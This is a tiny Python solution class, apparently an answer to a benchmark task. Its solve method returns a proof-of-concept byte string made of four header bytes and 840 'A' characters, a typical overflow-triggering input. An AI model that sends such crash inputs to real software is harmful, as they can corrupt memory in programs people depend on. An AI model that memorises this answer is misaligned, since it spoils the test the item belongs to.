class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'\x00\xff\x03\x48' + b'A' * 840
        return poc